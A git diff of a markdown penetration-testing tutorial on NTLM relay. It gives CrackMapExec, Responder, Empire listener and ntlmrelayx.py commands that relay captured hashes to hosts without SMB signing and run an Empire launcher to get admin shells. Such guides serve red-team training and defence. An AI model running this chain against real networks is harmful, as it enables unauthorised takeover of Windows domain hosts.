@@ -1,30 +1,33 @@
-
-
-
 ### Responder with NTLM relay attack
 
 byt3bl33d3r is a very prominent figure in this area. He has written some good guides on this attack. Because [b3t3bl33d3r's guide](https://byt3bl33d3r.github.io/practical-guide-to-NTLM-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
 ) is good I'll try to make it short.
 
-NetNTLMv2 is microsoft's challenge and response protocol. When authenticating to a server the user's hash followed by the server's challenge is used
+NetNTLMv2 is microsoft's challenge and response protocol. When authenticating to a server the user's hash followed by the server's challenge is used. With relaying hashes you simply take the NetNTLMv2 hash you collected and relay it to a set of hosts and hopefully the user(s) have administrator access. Then you execute a payload and woop de doo you have an admin shell.
 
-With relaying hashes you simply take the NetNTLMv2 hash you collected and relay it to a set of hosts and hopefully the user(s) have administrator access. Then you execute a payload and woop de doo you have an admin shell.
+Before we can do that we must generate a list of hosts in the domain suspectible to our attack. That is indicated by SMB-signing being disabled, which is default in most Windows OSs, except the Server.
 
-- `cme smb <CIDR> --gen-relay-list targets.txt` where the CIDR is your domain subnet. This generates a list where SMB-signing is disabled. The Server versions of Windows have SMB-signing enabled so you can't relay to that one.
+Execute this from the CrackMapExec package:
+```
+cme smb <CIDR> --gen-relay-list targets.txt
+```
+Where the CIDR is your domain subnet. This generates a list of hosts which have SMB-signing disabled. The Server versions of Windows have SMB-signing enabled so you can't relay to that one. Also important is the fact that you can't relay to the host the request orginated from.
 
 
 #### Responder
 
-Now in the previous attack REsponder had set up an HTTP and SMB server to act as a middleman. We now want to give our captured hashes to NTLMrelay, so we edit the REsponder.conf and turn off the HTTP and SMB server.
+Now in the previous attack Responder had set up an HTTP and SMB server to act as a middleman. We now want to give our captured hashes to NTLMrelay, so we edit `Responder.conf` to turn off the HTTP and SMB server.
 
 After that is done, run Responder like before:
-- `Responder -I eth0 -wrf` where eth0 is your interface. The -wrf is optional.
+```
+Responder -I eth0 -wrf
+```
+where eth0 is your interface. The -wrf is optional.
 
 
 #### Empire
 
-Now getting into Empire should take an hour or so to have it all memorized. A short guide can be found here, but I have a few commands listed below.
-https://www.sw1tch.net/2015/08/11/powershellempire-5-minute-quick-start-guide-featuring-kali-linux-andor-debian-8-0/
+Now getting into Empire should take an hour or so to have it all memorized. A short guide can be found [here](https://www.sw1tch.net/2015/08/11/powershellempire-5-minute-quick-start-guide-featuring-kali-linux-andor-debian-8-0/), but a few commands are listed below:
 
 ```
 uselistener http
@@ -38,8 +41,13 @@ agents
 ```
 
 #### NTLMrelay
-- NTLMrelay.tx
 
+Now perform the actual relaying using ntlmrelay from the Impacket library.
+
+
+```
+ntlmrelayx.py -tf targets.txt -c <insert your Empire Powershell launcher here>
+```
 
 Now copypaste the payload from Empire into the NTLMrelay command above. This will execute the payload for every box it relays to and it should be raining shells very soon. You will see a message in Empire saying it got an agent when it's successful. You will also see hashes written in the terminal while it's running.
 
